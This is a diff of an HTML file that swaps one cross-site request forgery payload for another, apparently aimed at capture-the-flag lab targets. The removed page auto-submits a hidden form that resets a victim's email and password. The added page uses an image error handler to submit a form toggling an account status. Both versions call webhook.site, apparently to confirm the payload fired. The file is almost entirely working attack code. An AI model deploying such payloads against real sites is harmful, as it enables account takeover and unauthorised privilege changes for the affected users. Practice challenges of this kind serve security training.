@@ -1,18 +1,21 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Submit Form</title>
-</head>
-<body onload="document.getElementById('supportForm').submit();">
-    <form id="supportForm" action="https://c28da2aeeeed.3xploit.me/index.php?page=user/profile.php" method="POST" enctype="multipart/form-data">
-        <input type="hidden" name="email" value="toto@gmail.com">
-        <input type="hidden" name="bio" value="HACKED">
-        <input type="file" name="profile_picture" value="" style="display:none;">
-        <input type="hidden" name="password" value="Totototo1!">
-        <input type="hidden" name="confirm_password" value="Totototo1!">
+<html>
+  <body onload="document.frames[0].submit()">
+    <form
+      action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
+      method="post"
+      id="myform"
+      name="myform"
+      enctype="multipart/form-data"
+    >
+      <input type="text" name="username" value="toto" />
+      <input type="checkbox" name="status" value="on" />
     </form>
-<img src="https://webhook.site/018a0620-b18e-4b00-9685-3e31a3cda308">
-</body>
+
+    <img
+      src="azerty.toto"
+      onerror="document.getElementById('myform').submit();"
+    />
+
+    <iframe src="https://webhook.site/306945d3-a762-4681-aa91-ec98165f7d00" />
+  </body>
 </html>
